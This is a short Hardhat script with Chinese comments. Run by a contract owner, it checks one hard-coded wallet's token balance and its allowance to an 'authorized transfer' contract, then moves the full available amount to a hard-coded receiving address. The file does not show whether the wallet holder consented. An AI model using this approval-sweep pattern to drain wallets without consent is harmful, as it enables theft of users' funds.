import hardhat from "hardhat";
const { ethers } = hardhat;

const authorizedTransferAddress = "0x9605d95B76a406982c08BC379c032dc80F273448";
const fromAddress = "0xf3b5182c9edb3f4b437952be1d586dd00d56aa7a";          // 之前授权给合约的用户
const toAddress = "0x06752cf9182fe0547426a9ade9fcf668765e0727";             // 目标收款地址
const tokenAddress = "0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2";

async function main() {
  const [owner] = await ethers.getSigners();  // 需要是合约owner调用
  console.log("调用者地址:", owner.address);

  // 创建ERC20合约实例
  const erc20Abi = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function decimals() external view returns (uint8)"
  ];

  const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, owner);

  // 检查账户余额
  const balance = await tokenContract.balanceOf(fromAddress);
  console.log("账户余额:", ethers.formatUnits(balance, await tokenContract.decimals()));

  // 检查授权额度
  const allowance = await tokenContract.allowance(fromAddress, authorizedTransferAddress);
  console.log("授权额度:", ethers.formatUnits(allowance, await tokenContract.decimals()));

  if (balance === 0n) {
    throw new Error("账户余额为0");
  }

  if (allowance === 0n) {
    throw new Error("未授权给合约或授权额度为0");
  }

  // 设定转账金额（实际合约会自动取授权额度和余额的较小值）
  // const amount = balance; // 现在无需在脚本中指定金额

  const abi = [
    "function transferFromAuthorized(address token, address from, address to) external"
  ];

  const contract = new ethers.Contract(authorizedTransferAddress, abi, owner);

  const tx = await contract.transferFromAuthorized(tokenAddress, fromAddress, toAddress);
  console.log("交易已发送，hash:", tx.hash);

  const receipt = await tx.wait();
  console.log("交易成功，区块号:", receipt.blockNumber);
}

main().catch(console.error);
